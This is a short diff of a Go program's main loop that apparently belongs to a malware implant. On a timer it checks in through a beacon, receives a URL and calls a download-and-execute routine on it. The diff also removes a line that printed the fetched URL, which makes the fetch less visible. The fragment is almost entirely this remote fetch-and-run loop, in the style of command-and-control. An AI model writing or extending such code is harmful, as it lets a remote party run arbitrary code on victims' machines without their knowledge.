@@ -24,12 +24,11 @@ func main() {
 	for {
 		if checkIn.Before(time.Now()) {
 			url := beacon.Ping()
-			
+
 			if url != "" {
-				fmt.Println(url)
 				downloader.DownloadExec(url)
 			}
-			
+
 			checkIn = updateCheckinTime()
 		}
 
